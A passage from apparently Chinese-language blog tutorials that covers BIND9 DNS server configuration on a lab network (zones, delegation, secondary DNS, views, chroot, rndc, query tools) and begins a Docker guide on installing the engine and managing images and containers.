设置类型为masterfile: 设置区域的解析记录文件名称为host.com.zoneallow-update: 设置动态更新的ip，我这写的是none即不允许动态更新\n现在设置此域名的解析记录，在/var/named/下创建对应文件host.com.zone并编辑\n[root@localhost named]# pwd/var/named[root@localhost named]# touch host.com.zone[root@localhost named]# vim host.com.zonehost.com. 600 IN SOA ns1.host.com. chai.simplefish.cn. (                        202212101      ;序列号，每次更新记录则需要修改                        10800          ;刷新时间，没隔多久到主服务器更新一次                        900            ;重试时间，应该小于刷新时间                        604800         ;过期时间，当辅助dns服务器无法联系主服务器的时间，超过这个时间则过期                        86400          ;非权威应答的ttl，缓存DNS记录多长时间)host.com. 600 IN NS ns1.host.com.ns1.host.com. 60 IN A 192.160.0.100dns.host.com. 60 IN A 192.160.0.100bind.host.com. 60 IN A 192.160.0.100www.host.com. 60 IN A 192.160.0.100[root@localhost named]# systemctl start named    //启动服务\n一共有六条记录，其中SOA和NS记录时必须要有的。记录写法为: 主机名 TTL值 IN 记录类型 值在bind9里的所有配置文件中 所有的域名最后都必须带有”.”，这个”.”意味着根域的意思所以必须要有，不然启动服务的时候会报语法错误。\n测试打开自己电脑的CMD执行一下操作\nC:\\Users\\SimpleFish&gt;nslookup    //使用nslookup工具默认服务器:  public1.114dns.comAddress:  114.114.114.114&gt; server 192.168.0.100          //server设置测试dns的服务器地址默认服务器:  [192.168.0.100]Address:  192.168.0.100&gt; set type=any                  //设置类型为any(全部)&gt; host.com                      //查看host.com的SOA记录服务器:  [192.168.0.100]Address:  192.168.0.100host.com        primary name server = ns1.host.com        responsible mail addr = chai.simplefish.cn        serial  = 202212101        refresh = 10800 (3 hours)        retry   = 900 (15 mins)        expire  = 604800 (7 days)        default TTL = 86400 (1 day)host.com        nameserver = ns1.host.comns1.host.com    internet address = 192.160.0.100&gt; ls host.com                                       //列出host.com的基本记录[[192.168.0.100]] host.com.                      NS     server = ns1.host.com bind                           A      192.160.0.100 dns                            A      192.160.0.100 ns1                            A      192.160.0.100 www                            A      192.160.0.100&gt;\n\n配置一个反向解析域[root@localhost ~]# tail -n5 /etc/named.rfc1912.zones    //查看区域配置文件zone &quot;0.168.192.in-addr.arpa&quot; IN &#123;        type master;        file &quot;0.168.192.in-addr.zone&quot;;        allow-update &#123; none; &#125;;&#125;;[root@localhost ~]# cat /var/named/0.168.192.in-addr.zone              //查看区域的解析文件0.168.192.in-addr.arpa. 600 IN SOA ns1.host.com. chai.simplefish.cn. (                        202212101      ;序列号，每次更新记录则需要修改                        10800          ;刷新时间，没隔多久到主服务器更新一次                        900            ;重试时间，应该小于刷新时间                        604800         ;过期时间，当辅助dns服务器无法联系主服务器的时间                        86400          ;非权威应答的ttl，缓存DNS记录多长时间)0.168.192.in-addr.arpa. 600 IN NS ns1.host.com.100.0.168.192.in-addr.arpa. 600 IN PTR dns.host.com.100.0.168.192.in-addr.arpa. 600 IN PTR bind.host.com.100.0.168.192.in-addr.arpa. 600 IN PTR www.host.com.[root@localhost ~]# systemctl restart named\n和正向解析的写法略有差别，反向解析的去域名是网段反写加in-addr.arpa，然后解析记录文件也是必须要写SOA记录和NS记录的，反向解析的记录类型为PTR。然后依旧是必须带根域”.”。\n测试C:\\Users\\SimpleFish&gt;nslookup默认服务器:  public1.114dns.comAddress:  114.114.114.114&gt; server 192.168.0.100默认服务器:  [192.168.0.100]Address:  192.168.0.100&gt; set type=PTR         //设置类型为PTR反向解析记录&gt; 192.168.0.100服务器:  [192.168.0.100]Address:  192.168.0.100100.0.168.192.in-addr.arpa      name = dns.host.com100.0.168.192.in-addr.arpa      name = www.host.com100.0.168.192.in-addr.arpa      name = bind.host.com0.168.192.in-addr.arpa  nameserver = ns1.host.comns1.host.com    internet address = 192.160.0.100\n\n委派DNS委派DNS的意思实质上就是指自己域名的下一级域名交给另一台主机来管理，也可以叫做子域。具体配置如下\n[root@linux-1 ~]# tail -n 5 /etc/named.rfc1912.zoneszone &quot;host.com.&quot; IN &#123;        type master;        file &quot;host.com.zone&quot;;        allow-update &#123; none; &#125;;&#125;;[root@linux-1 ~]# cat /var/named/host.com.zonehost.com. 600   IN SOA  dns1.host.com. chai.simplefish.cn. (                                        0       ; serial                                        10800   ; refresh                                        900     ; retry                                        604800  ; expire                                        86400 ) ; minimumhost.com.               600 IN NS ns1.host.com.dns1.host.com.          60 IN A 192.168.1.111ns1.host.com.           60 IN A 192.168.1.111www.host.com.           60 IN A 192.168.1.111shanghai.host.com.      600 IN NS ns2.host.com.ns2.host.com.           60 IN A 192.168.1.112\n把需要委托的下一级域名指定一条NS记录，记录指向委派的主机，上面是把shanghai.host.com这个三级域委派给192.168.1.112主机再来看一下被委派主机的配置\n[root@linux-2 ~]# tail -5 /etc/named.rfc1912.zoneszone &quot;shanghai.host.com.&quot; IN &#123;        type master;        file &quot;shanghai.host.com.zone&quot;;        allow-update &#123; none; &#125;;&#125;;[root@linux-2 ~]# cat /var/named/shanghai.host.com.zoneshanghai.host.com. 600  IN SOA  dns1.shanghai.host.com. chai.simplefish.cn. (                                        0       ; serial                                        1D      ; refresh                                        1H      ; retry                                        1W      ; expire                                        3H )    ; minimumshanghai.host.com.                      600 IN NS ns1.shanghai.host.com.ns1.shanghai.host.com.                  60 IN A 192.168.1.112dns1.shanghai.host.com.                 60 IN A 192.168.1.112www.shanghai.host.com.                  60 IN A 192.168.1.112\n被委派的则就可以正常配置，测试的话只需要指定第一台dns即可查询到委派的信息第三台主机测试如下\n[root@linux-3 ~]# dig -t A www.host.com @192.168.1.111 +short192.168.1.111[root@linux-3 ~]# dig -t A www.shanghai.host.com @192.168.1.111 +short192.168.1.112\n\n辅助DNS主DNS的配置需要修改的参数如下\n\nlisten-on port 53 &#123; 服务器的IP; &#125;;    &#x2F;&#x2F;监听的ipv4端口以及ip，需要改成自己的主机ip\nallow-query     &#123; any; &#125;;    &#x2F;&#x2F;允许查询的ip,需要改为any\nallow-transfer  &#123; 辅助DNS服务器的IP &#125;;      &#x2F;&#x2F;允许同步自己信息的服务器，默认没有这个参数需要在主配置文件的options {}里面添加，这个参数可以写在区域文件里面。\nalso-notify   &#123; 辅助DNS服务器的IP &#125;;      &#x2F;&#x2F;当服务器记录更新时通知对应设置的服务器，默认没有这个参数需要在主配置文件的options {}里面添加，这个参数可以写在区域文件里面。\n\n辅助DNS的配置需要修改的参数如下\n\nlisten-on port 53 &#123; 服务器的IP; &#125;;    &#x2F;&#x2F;监听的ipv4端口以及ip，需要改成自己的主机ip\nallow-query     &#123; any; &#125;;    &#x2F;&#x2F;允许查询的ip,需要改为any\nmasterfile-format text;    &#x2F;&#x2F;设置同步到本地的文件格式，默认没有这个参数需要在主配置文件的options {}里面添加\n\n主DNS的区域配置和解析配置如下\n[root@master ~]# tail -n5 /etc/named.rfc1912.zoneszone &quot;host.com.&quot; IN &#123;        type master;        file &quot;host.com.zone&quot;;        allow-update &#123; none; &#125;;&#125;;[root@master ~]# cat /var/named/host.com.zonehost.com. 600 IN SOA ns1.host.com. chai.simplefish.cn. (                        202212201      ;序列号，每次更新记录则需要修改                        10800          ;刷新时间，没隔多久到主服务器更新一次                        900            ;重试时间，应该小于刷新时间                        604800         ;过期时间，当辅助dns服务器无法联系主服务器的时间                        86400          ;非权威应答的ttl，缓存DNS记录多长时间)host.com. 600 IN NS ns1.host.com.ns1.host.com. 60 IN A 192.160.0.101dns.host.com. 60 IN A 192.160.0.101bind.host.com. 60 IN A 192.160.0.101www.host.com. 60 IN A 192.160.0.101[root@master ~]# systemctl restart named\n\n辅助DNS的区域配置和解析配置如下\n[root@slave ~]# tail -n5 /etc/named.rfc1912.zoneszone &quot;host.com.&quot; IN &#123;        type slave;        masters &#123; 192.168.0.101; &#125;;        file &quot;slaves/host.com.zone&quot;;&#125;;[root@slave ~]# systemctl restart named\n辅助DNS只需要写一个区域配置即可，解析记录它会自动同步。这里类型设置成了slavemasters是设置主DNS服务器的IPfile这里设置了一个路径是slaves这个路径是可以自己改的，如果要改的话权限一定对的上不然可能会出问题，我建议就是创建的文件或者目录的用户和属组都换成named刷新成功后他会在/var/named/slaves下生成对应的文件\n[root@slave slaves]# pwd/var/named/slaves[root@slave slaves]# cat host.com.zone$ORIGIN .$TTL 600        ; 10 minuteshost.com                IN SOA  ns1.host.com. chai.simplefish.cn. (                                202212201  ; serial                                10800      ; refresh (3 hours)                                900        ; retry (15 minutes)                                604800     ; expire (1 week)                                86400      ; minimum (1 day)                                )                        NS      ns1.host.com.$ORIGIN host.com.$TTL 60 ; 1 minutebind                    A       192.160.0.101dns                     A       192.160.0.101ns1                     A       192.160.0.101www                     A       192.160.0.101\n他这种是宏定义的方式来同步解析文件这种写法后面也会说一下。反向解析的辅助DNS配置一样域名换一下即可。\n智能DNS智能DNS主要作用就是不同的网段去解析一个域名，可以实现解析不同的地址。\nACL组ACL组可以用来定义一个ip的范围。any参数就是一个acl组，他代表的是全部的IP。定义方式如下\nacl &quot;acl_name&quot; &#123;        acl_name;        //其他的acl组        192.168.0.0/24;  //网段        !192.168.0.2;   //不包括192.168.0.2这个ip        &#123;                        //添加ip组                192.168.1.2;                192.168.1.3;        &#125;;&#125;;\n\nview视图view视图可以对acl组单独设置dns的区域解析。写法方式如下\nview &quot;view_name&quot; &#123;                     //设置view视图的名称    match-clients &#123; acl组; &#125;;          //设置acl组    recursion yes;                     //允许递归查询    zone &quot;host.com.&quot; &#123;                 //正常写zone区域        type master;        file &quot;host.com.zone&quot;;        allow-update &#123; none; &#125;;    &#125;;&#125;;\n如果要使用view视图那么就需要把所有的区域都放到view视图里面，除了自己设置的默认还有一个默认的view视图，名称为”default”,需要把根域”.”加进去以及/etc/named.rfc1912.zones里的所有zone。\n配置[root@localhost named]# tail -n14 /etc/named.conf //查看主配置文件。include &quot;/etc/named-view.conf&quot;;     //引入我自己创建的视图文件view &quot;default&quot; &#123;        match-clients &#123; any; &#125;;        recursion yes;        zone &quot;.&quot; IN &#123;                type hint;                file &quot;named.ca&quot;;        &#125;;        include &quot;/etc/named.rfc1912.zones&quot;;&#125;;include &quot;/etc/named.root.key&quot;;[root@localhost named]# cat /etc/named-view.conf          //查看我自己创建的视图文件内容acl &quot;test01&quot; &#123;                192.168.0.101;                   //定义acl test01&#125;;acl &quot;test02&quot; &#123;                192.168.0.107;                   //定义acl test02&#125;;view &quot;test01&quot; &#123;                                  //配置视图test01        match-clients &#123; test01; &#125;;        recursion yes;        zone &quot;host.com.&quot; &#123;                type master;                file &quot;host.com.test01.zone&quot;;                allow-update &#123; none; &#125;;        &#125;;&#125;;view &quot;test02&quot; &#123;                                 //配置视图test02        match-clients &#123; test02; &#125;;        recursion yes;        zone &quot;host.com.&quot; &#123;                type master;                file &quot;host.com.test02.zone&quot;;                allow-update &#123; none; &#125;;        &#125;;&#125;;\n我把根域和named.rfc1912.zones里的所有域都放到了default视图里面。然后我还引入了一个文件用来专门放acl和view的文件，配置文件是有前后之分的如果把”default”视图放到前面则都只会匹配”default”视图所以我把它放到了前面，文件里定义了两个acl，分别是两个ip，之后分别配置了一个视图，视图里都是同一个域名但是解析文件不一样。当匹配到acl规则之后会走对应的解析文件。否则走”default”视图。\n公网DNS因为BIND软件开源所以公网dns涉及到一个安全的问题，就有了BIND-CHROOT这个东西，当运行的时候bind会在另一个根下运行，当服务器因为DNS某些漏洞被黑入的时候他也只能在这个根下操作。从而保证整个服务器的数据安全。配置bind-chroot的方式\n[root@localhost ~]# yum -y install bind[root@localhost ~]# yum -y install bind-chroot[root@localhost ~]# cd /var/named/chroot/etc/[root@localhost etc]# ln /etc/named* ./ln: /etc/named: hard link not allowed for directory[root@localhost etc]# cd ../var/named/[root@localhost named]# ln /var/named/* ./ln: /var/named/chroot: hard link not allowed for directoryln: /var/named/data: hard link not allowed for directoryln: /var/named/dynamic: hard link not allowed for directoryln: /var/named/slaves: hard link not allowed for directory[root@localhost named]# mkdir data dynamic slaves[root@localhost named]# chown named:named data dynamic slaves[root@localhost named]# systemctl start named-chroot\n装好bind-chroot之后需要把原来的文件结构都搞到/var/named/chroot下这个chroot下就是一个服务运行的根，开启时服务名称改为named-chroot，文件结构不管是复制还是剪切都可以只要有对应结构的文件都在就行，我这里做的是硬链接，往后的配置都需要在/var/named/chroot/这个根下面进行。\nBIND-UTILS工具包安装[root@localhost named]# yum -y install bind-utils\n\nnslookup非交互式\nnslookup &quot;解析的域名&quot;[root@localhost ~]# nslookup ns1.host.comServer:         192.168.0.105Address:        192.168.0.105#53Name:   ns1.host.comAddress: 192.168.0.105\n\n交互式\n[root@localhost ~]# nslookup&gt; server 192.168.0.105Default server: 192.168.0.105Address: 192.168.0.105#53&gt; www.host.comServer:         192.168.0.105Address:        192.168.0.105#53Name:   www.host.comAddress: 192.168.0.105&gt; set type=SOA&gt; host.comServer:         192.168.0.105Address:        192.168.0.105#53host.com        origin = ns1.host.com        mail addr = chai.simplefish.cn        serial = 0        refresh = 86400        retry = 86400        expire = 86400        minimum = 86400\n\nhosthost -t &quot;类型&quot; &quot;域名&quot; &quot;DNS地址&quot;[root@localhost ~]# host -t A www.host.com 192.168.0.105Using domain server:Name: 192.168.0.105Address: 192.168.0.105#53Aliases:www.host.com has address 192.168.0.105[root@localhost ~]# host -t ns host.com 192.168.0.105Using domain server:Name: 192.168.0.105Address: 192.168.0.105#53Aliases:host.com name server ns1.host.com.\n\ndigdig -t &quot;类型&quot; &quot;域名&quot; @&quot;DNS地址&quot; 参数+short  返回精简结果-x      进行逆向域名查询+noall  忽略全部，不进行输出+answer 只输出结果，省略过程+trace：进行迭代查[root@localhost ~]# dig -t A www.host.com @192.168.0.105; &lt;&lt;&gt;&gt; DiG 9.11.26-RedHat-9.11.26-6.el8 &lt;&lt;&gt;&gt; -t A www.host.com @192.168.0.105;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 47724;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 2;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 1232; COOKIE: d97935613cf3169f270c53e061ed0fe27016722968769c4a (good);; QUESTION SECTION:                           //说明查询内容;www.host.com.                  IN      A;; ANSWER SECTION:                             //查询结果www.host.com.           60      IN      A       192.168.0.105;; AUTHORITY SECTION:                          //查询附加内容host.com.               600     IN      NS      ns1.host.com.;; ADDITIONAL SECTION:                         //查询附加内容ns1.host.com.           60      IN      A       192.168.0.105;; Query time: 0 msec;; SERVER: 192.168.0.105#53(192.168.0.105);; WHEN: Sun Jan 23 03:20:50 EST 2022;; MSG SIZE  rcvd: 119[root@localhost ~]# dig -t A www.host.com @192.168.0.105 +short192.168.0.105\n\nnsupdatensupdate是用来添加和删除记录，不支持修改记录。使用方法只能是交互式使用。使用命令前需要把区域的allow-update参数修改一下，改成使用nsupdate主机的ip即可。可以使用acl。\n[root@localhost ~]# tail -n5 /etc/named.rfc1912.zoneszone &quot;host.com.&quot; IN &#123;        type master;        file &quot;host.com.zone&quot;;        allow-update &#123; 192.168.0.105; &#125;;                 //修改允许动态更新的ip地址&#125;;[root@localhost ~]# systemctl restart named              //重启生效[root@localhost ~]# nsupdate&gt; server 192.168.0.105                                      //指定DNS服务器地址&gt; update add server.host.com 60 A 192.168.0.105             //add就是添加 之后写一条记录 记录写法很严格给必须是&quot;记录 TTL 记录类型 记录值&quot;&gt; send                              //更新&gt; quit                              //退出[root@localhost ~]# dig -t A server.host.com @192.168.0.105 +short192.168.0.105[root@localhost ~]# nsupdate&gt; server 192.168.0.105&gt; update del server.host.com                   //del为删除删除记录&gt; send&gt; quit[root@localhost ~]# dig -t A server.host.com @192.168.0.105 +short\n是用这个命令不会在自己创建的记录文件里添加记录，而是会生成一个jnl日志文件，正常编辑为乱码。\n[root@localhost named]# cat host.com.zone.jnl;BIND LOG V9▒8▒▒JhostcomX6ns1hostcomchaisimplefishcnQ▒Q▒Q▒Q▒JhostcomX6ns1hostcomchaisimplefishcnQ▒Q▒Q▒Q▒serverhostcom&lt;▒i▒JhostcomX6ns1hostcomchaisimplefishcnQ▒Q▒Q▒Q▒serverhostcom&lt;▒iJhostcomX6ns1hostcomchaisimplefishcnQ▒Q▒Q▒Q▒[root@localhost named]#\n\nRNDC管理BIND9rndc可以对bind9进行热更新，可以对某个域的解析单独进行重载。使用方法如下\n[root@localhost ~]# rndc-confgen# Start of rndc.confkey &quot;rndc-key&quot; &#123;        algorithm hmac-md5;        secret &quot;e7SaG876PM54+/1bRFh/JQ==&quot;;&#125;;options &#123;        default-key &quot;rndc-key&quot;;        default-server 127.0.0.1;        default-port 953;&#125;;# End of rndc.conf# Use with the following in named.conf, adjusting the allow list as needed:# key &quot;rndc-key&quot; &#123;#       algorithm hmac-md5;#       secret &quot;e7SaG876PM54+/1bRFh/JQ==&quot;;# &#125;;## controls &#123;#       inet 127.0.0.1 port 953#               allow &#123; 127.0.0.1; &#125; keys &#123; &quot;rndc-key&quot;; &#125;;# &#125;;# End of named.conf\nrndc-confgen这个命令会生成两段配置，使用”#”注释的配置字段需要放到服务端的配置文件里，未注释的字段需要放到控制端进行配置。\n服务端配置\n[root@localhost ~]# tail -n8 /etc/named.confkey &quot;rndc-key&quot; &#123;        algorithm hmac-md5;        secret &quot;e7SaG876PM54+/1bRFh/JQ==&quot;;&#125;;controls &#123;        inet 192.168.0.105 port 953                //这个地址需要修改成DNS服务器的主机地址        allow &#123; any; &#125; keys &#123; &quot;rndc-key&quot;; &#125;;       //这个allow &#123;&#125; 是允许谁来进行操作，我这里写的any意思为全部，不建议这样搞建议写成控制端的ip。&#125;;[root@localhost ~]# systemctl restart named\n\n控制端配置\n[root@localhost ~]# cat /etc/rndc.confkey &quot;rndc-key&quot; &#123;                algorithm hmac-md5;                secret &quot;e7SaG876PM54+/1bRFh/JQ==&quot;;&#125;;options &#123;                default-key &quot;rndc-key&quot;;                default-server 192.168.0.105;                default-port 953;&#125;;[root@localhost ~]# rm -rf /etc/rndc.key        //默认系统里会自带一个rndc的key删除即可[root@localhost ~]# rndc status                     //查看状态，不报错就可以用了version: BIND 9.11.26-RedHat-9.11.26-6.el8 (Extended Support Version) &lt;id:3ff8620&gt;running on localhost.localdomain: Linux x86_64 4.18.0-305.3.1.el8.x86_64 #1 SMP Tue Jun 1 16:14:33 UTC 2021boot time: Sun, 23 Jan 2022 10:21:45 GMTlast configured: Sun, 23 Jan 2022 10:21:45 GMTconfiguration file: /etc/named.confCPUs found: 1worker threads: 1UDP listeners per interface: 1number of zones: 104 (97 automatic)debug level: 0xfers running: 0xfers deferred: 0soa queries in progress: 0query logging is OFFrecursive clients: 0/900/1000tcp clients: 3/150TCP high-water: 3server is up and running\n这是基本的配置，使用方式如下\n不允许动态更新的域\nallow-update &#123; none; &#125;;    //配置区域的时候这个参数为none[root@localhost ~]# dig -t A a.host.com @192.168.0.105 +short[root@localhost ~]# echo &quot;a                       A       192.168.0.105&quot; &gt;&gt; /var/named/host.com.zone[root@localhost ~]# rndc reload host.comzone reload queued[root@localhost ~]# dig -t A a.host.com @192.168.0.105 +short192.168.0.105\n\n允许动态更新的域\nallow-update &#123; IP; &#125;;    //配置区域的时候这个参数有内容[root@localhost ~]# dig -t A b.host.com @192.168.0.105 +short[root@localhost ~]# echo &quot;b                       A       192.168.0.105&quot; &gt;&gt; /var/named/host.com.zone[root@localhost ~]# rndc freeze host.com     //冻结这个动态域[root@localhost ~]# rndc reload host.com     //重载zone reload queued[root@localhost ~]# rndc thaw host.com       //启用动态域The zone reload and thaw was successful.[root@localhost ~]# dig -t A b.host.com @192.168.0.105 +short192.168.0.105\n\n其他宏定义写法$ORIGIN .                            //宏定义根域$TTL 600        ; 10 minutes         //宏定义TTL值//定义之后的就可以不用谢TTL和根域了，就和这条SOA记录一样，他会自动的在域名后面加根域和TTLhost.com                IN SOA  ns1.host.com. chai.simplefish.cn. (                                2          ; serial                                86400      ; refresh (1 day)                                86400      ; retry (1 day)                                86400      ; expire (1 day)                                86400      ; minimum (1 day)                                )                        NS      ns1.host.com.$ORIGIN host.com.                          //重新定义域名$TTL 60 ; 1 minute                         //重新定义TTLdns                     A       192.168.0.105      //域名则可以省略掉宏定义的内容ns1                     A       192.168.0.105www                     A       192.168.0.105\n\n如何验证我的配置？使用nslookup，host，dig，ping都可以来验证自己配置的DNS服务器，如果服务器可以重启依旧不同则可以依次检查服务器的防火墙、网络互通性、客户端的DNS是否为服务端来解决问题。\n","categories":["网络服务"],"tags":["DNS","网络服务","Bind9"]},{"title":"Docker-容器管理","url":"/2022/04/06/Docker-%E5%AE%B9%E5%99%A8%E7%AE%A1%E7%90%86/","content":"Docker 概述Docker 是一个开源项目，诞生于 2013 年初，最初是 dotCloud 公司内部的一个业余项目。它基于 Google 公司推出的 Go 语言实现。项目后来加入了 Linux 基金会，遵从了 Apache 2.0 协议，项目代码在 GitHub 上进行维护。Docker 项目的目标是实现轻量级的操作系统虚拟化解决方案。Docker 的基础是 Linux 容器（LXC）等技术。\n下面的图片比较了容器技术和传统的虚拟化技术的对比，可见容器是在操作系统的基础上实现虚拟化，传统的虚拟化技术还需要一层 Guest OS 系统作为基础实现。\n\nDocker 的安装官方文档: https://docs.docker.com/get-docker/\nDocker 的安装文档清晰明了，可以直接按照其给定的步骤一步一步操作。\n卸载旧版本以及残留sudo yum remove docker \\                docker-client \\                docker-client-latest \\                docker-common \\                docker-latest \\                docker-latest-logrotate \\                docker-logrotate \\                docker-engine\n\n设置 Docker 的 YUM 软件仓库sudo yum install -y yum-utilssudo yum-config-manager \\    --add-repo \\    https://download.docker.com/linux/centos/docker-ce.repo\n\n安装sudo yum install docker-ce docker-ce-cli containerd.io docker-compose-plugin\n\n设置 Docker 开机自启并启动sudo systemctl enable --now docker\n\n运行一个 Docker 测试镜像来验证安装[root@docker ~]# sudo docker run hello-worldUnable to find image &#x27;hello-world:latest&#x27; locallylatest: Pulling from library/hello-world2db29710123e: Pull completeDigest: sha256:10d7d58d5ebd2a652f4d93fdd86da8f265f5318c6a73cc5b6a9798ff6d2b2e67Status: Downloaded newer image for hello-world:latestHello from Docker!This message shows that your installation appears to be working correctly.To generate this message, Docker took the following steps: 1. The Docker client contacted the Docker daemon. 2. The Docker daemon pulled the &quot;hello-world&quot; image from the Docker Hub.    (amd64) 3. The Docker daemon created a new container from that image which runs the    executable that produces the output you are currently reading. 4. The Docker daemon streamed that output to the Docker client, which sent it    to your terminal.To try something more ambitious, you can run an Ubuntu container with: $ docker run -it ubuntu bashShare images, automate workflows, and more with a free Docker ID: https://hub.docker.com/For more examples and ideas, visit: https://docs.docker.com/get-started/\n\nDocker 的命令镜像的管理搜索&#x2F;检索docker search 镜像名称\n\n示例：\n[root@docker ~]# docker search nginxNAME                                              DESCRIPTION                                     STARS     OFFICIAL   AUTOMATEDnginx                                             Official build of Nginx.                        16597     [OK]bitnami/nginx                                     Bitnami nginx Docker Image                      121                  [OK]ubuntu/nginx                                      Nginx, a high-performance reverse proxy &amp; we…   39bitnami/nginx-ingress-controller                  Bitnami Docker Image for NGINX Ingress Contr…   17                   [OK]rancher/nginx-ingress-controller                                                                  10ibmcom/nginx-ingress-controller                   Docker Image for IBM Cloud Private-CE (Commu…   4bitnami/nginx-ldap-auth-daemon                                                                    3bitnami/nginx-exporter                                                                            2circleci/nginx                                    This image is for internal use                  2\n\n默认从 Docker Hub 进行搜索镜像。\n下载&#x2F;拉取docker pull 名称:版本\n\n示例：\n[root@docker ~]# docker pull nginx:1.21.61.21.6: Pulling from library/nginxc229119241af: Pull complete2215908dc0a2: Pull complete08c3cb2073f1: Pull complete18f38162c0ce: Pull complete10e2168f148a: Pull completec4ffe9532b5f: Pull completeDigest: sha256:2275af0f20d71b293916f1958f8497f987b8d8fd8113df54635f2a5915002bf1Status: Downloaded newer image for nginx:1.21.6docker.io/library/nginx:1.21.6\n\n如果不加版本，则拉取 latest 版本，即最新版本。\n镜像列表docker imagesdocker image ls\n\n示例：\n[root@docker ~]# docker imagesREPOSITORY                                                        TAG       IMAGE ID       CREATED        SIZEnginx                                                             1.21.6    12766a6745ee   10 days ago    142MBrancher/mirrored-flannelcni-flannel                               v0.17.0   9247abf08677   5 weeks ago    59.8MBrancher/mirrored-flannelcni-flannel-cni-plugin                    v1.0.1    ac40ce625740   2 months ago   8.1MBregistry.aliyuncs.com/google_containers/kube-apiserver            v1.23.0   e6bf5ddd4098   4 months ago   135MBregistry.aliyuncs.com/google_containers/kube-controller-manager   v1.23.0   37c6aeb3663b   4 months ago   125MBregistry.aliyuncs.com/google_containers/kube-scheduler            v1.23.0   56c5af1d00b5   4 months ago   53.5MBregistry.aliyuncs.com/google_containers/kube-proxy                v1.23.0   e03484a90585   4 months ago   112MBregistry.aliyuncs.com/google_containers/etcd                      3.5.1-0   25f8c7f3da61   5 months ago   293MBregistry.aliyuncs.com/google_containers/coredns                   v1.8.6    a4ca41631cc7   6 months ago   46.8MBregistry.aliyuncs.com/google_containers/pause                     3.6       6270bb605e12   7 months ago   683kB\n\n五列数据分别代表镜像名称、镜像版本、镜像 ID、拉取时间、镜像大小。\n镜像标签docker tag [imagesID] 改后名称:改后tag\n\n示例：\n[root@docker ~]# docker tag nginx:1.21.6 mynginx:1.21.6[root@docker ~]# docker images |grep nginxmynginx                                                           1.21.6    12766a6745ee   10 days ago    142MBnginx                                                             1.21.6    12766a6745ee   10 days ago    142MB\n\n镜像删除docker rmi 镜像id\n\n示例：\n[root@docker ~]# docker rmi mynginx:1.21.6Untagged: mynginx:1.21.6\n\n镜像导出docker save 镜像id/镜像名 &gt; 名字.tar\n\n示例：\n[root@docker ~]# docker save nginx:1.21.6 &gt; nginx-v1.21.6.tar[root@docker ~]# lsnginx-v1.21.6.tar\n\n镜像导入docker load &lt; 包名\n\n示例：\n[root@docker ~]# docker rmi nginx:1.21.6Untagged: nginx:1.21.6Untagged: nginx@sha256:2275af0f20d71b293916f1958f8497f987b8d8fd8113df54635f2a5915002bf1Deleted: sha256:12766a6745eea133de9fdcd03ff720fa971fdaf21113d4bc72b417c123b15619Deleted: sha256:3ea962f6f388096ab9798790d363fc6f9c779c924a5eddf5c699d8da080114f7Deleted: sha256:091a2aef7242e42505b69f1ad027d6a442cfce2403e260ac914f0fd6cc2d275fDeleted: sha256:4e72a31f1cd6fd655cc0826c91e886967b6e965e13ac21f31f9f66c27a3b7732Deleted: sha256:e3d1cdf9772a260b3e81a22c1940d63ac45dfe67720f78f00ca73834d9498934Deleted: sha256:af40da71a8618ea9cbcdc333d5e60bd5b6df820f0d07a55f7c9a1c21fd930095Deleted: sha256:608f3a074261105f129d707e4d9ad3d41b5baa94887f092b7c2857f7274a2fce[root@docker ~]# docker load &lt; nginx-v1.21.6.tar608f3a074261: Loading layer [==================================================&gt;]   83.9MB/83.9MBea207a4854e7: Loading layer [==================================================&gt;]     62MB/62MB33cf1b723f65: Loading layer [==================================================&gt;]  3.072kB/3.072kB5c77d760e1f4: Loading layer [==================================================&gt;]  4.096kB/4.096kBfac199a5a1a5: Loading layer [==================================================&gt;]  3.584kB/3.584kBea4bc0cd4a93: Loading layer [==================================================&gt;]  7.168kB/7.168kBLoaded image: nginx:1.21.6[root@docker ~]# docker images |grep nginxnginx                                                             1.21.6    12766a6745ee   10 days ago    142MB\n\n容器的管理创建容器docker run [options] image [command] [arg]\n\nOption 说明：\n\n-d: 后台运行\n-i: 以交互模式运行容器，通常与 -t 同时使用\n-t: 为容器重新分配一个伪输出终端，通常与 -i 同时使用\n--name: 设置容器名字\n--net: 指定网络连接类型\n--h: 设置主机名称\n--dns: 指定容器的 DNS 服务器，默认和宿主一致\n-e: 设置环境变量（&#x3D;””）\n-p: 本地端口:容器端口，把容器的某个端口暴露到主机的某个端口\n-v: 本地目录:容器目录，把主机的某目录挂载到容器的目录里面实现文件系统的链接\n--network: 指定网络\n--rm: 容器关闭后自动删除\n\n示例：使用命令 docker run -p 8080:80 -d --name nginx1 nginx 来运行一个 Nginx 容器，并且把容器的 80 端口暴露到本机的 8080：\n[root@docker ~]# docker run -p 8080:80 -d --name nginx1 nginxUnable to find image &#x27;nginx:latest&#x27; locallylatest: Pulling from library/nginx1fe172e4850f: Pull complete35c195f487df: Pull complete213b9b16f495: Pull completea8172d9e19b9: Pull completef5eee2cb2150: Pull complete93e404ba8667: Pull completeDigest: sha256:859ab6768a6f26a79bc42b231664111317d095a4f04e4b6fe79ce37b3d199097Status: Downloaded newer image for nginx:latest4cf61416ee672b595b99436d0fdcf8ebe5e6d22adaed8838b29e978f19372ecb\n\n容器的创建过程是先到本地查找镜像，如果没有则去 Docker Hub 镜像仓库拉取镜像后再运行。\n容器列表使用命令 docker ps 来查看已经启动的容器，如果有停止运行的容器可以添加 -a 参数来查看：\n[root@docker ~]# docker psCONTAINER ID   IMAGE     COMMAND                  CREATED         STATUS         PORTS                                   NAMES4cf61416ee67   nginx     &quot;/docker-entrypoint.…&quot;   3 minutes ago   Up 3 minutes   0.0.0.0:8080-&gt;80/tcp, :::8080-&gt;80/tcp   nginx1\n\n关闭容器使用命令 docker stop &#123;容器ID|容器名称&#125; 来关闭容器：\n[root@docker ~]# docker ps -aCONTAINER ID   IMAGE         COMMAND                  CREATED         STATUS                     PORTS     NAMES4cf61416ee67   nginx         &quot;/docker-entrypoint.…&quot;   6 minutes ago   Exited (0) 4 seconds ago             nginx158e6c5af6efe   hello-world   &quot;/hello&quot;                 12 hours ago    Exited (0) 12 hours ago              great_chatterjee\n\n启动容器使用命令 docker start &#123;容器ID|容器名称&#125; 来开启容器：\n[root@docker ~]# docker psCONTAINER ID   IMAGE     COMMAND                  CREATED         STATUS         PORTS                                   NAMES4cf61416ee67   nginx     &quot;/docker-entrypoint.…&quot;   7 minutes ago   Up 6 seconds   